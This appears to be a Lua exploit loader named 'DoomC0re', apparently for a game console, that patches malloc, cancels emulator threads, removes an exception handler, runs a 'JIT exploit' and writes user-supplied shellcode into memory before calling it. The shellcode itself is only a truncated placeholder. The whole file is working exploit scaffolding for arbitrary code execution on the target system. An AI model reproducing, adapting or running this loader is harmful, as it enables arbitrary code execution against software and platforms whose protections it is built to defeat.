-- doom.lua – Replace the 'sc' hex string with your binary payload
require "global"
require "rop"
require "memory"
require "func"
require "misc"
require "syscall"
require "jit"
version_string = "DoomC0re 1.0"
init_native_functions()
patch_malloc()
syscall.init()
scePthreadCancel(read64(THREAD_HANDLE_IOP_SPU2))
scePthreadCancel(read64(THREAD_HANDLE_GS))
sceKernelRemoveExceptionHandler(11)
FW_VERSION = get_fwversion()
TITLE_ID = get_title_id()
send_notification(string.format("%s\nPlatform: %s\nFW: %s\nTitle ID: %s",
                version_string, PLATFORM, FW_VERSION, TITLE_ID))
local status, errmsg = jit_init()
if not status then
    show_dialog("JIT exploit failed\n" .. errmsg)
    return
end
-- REPLACE BELOW WITH YOUR SHELLCODE HEX
local sc = "4881ec..."
local bin = hex_to_binary(sc)
write_shellcode(SHELLCODE_BASE, bin)
local ext = malloc(0x80)
memset(ext, 0, 0x80)
write64(ext+0x00, 0xDEAD)
write32(ext+0x18, log_sock)
write32(ext+0x1C, -1)
func_wrap(SHELLCODE_BASE)(EBOOT_BASE, SCE_KERNEL_DLSYM, ext)
local frames = read32(ext+0x10)
send_notification("DoomC0re done, frames: " .. frames)
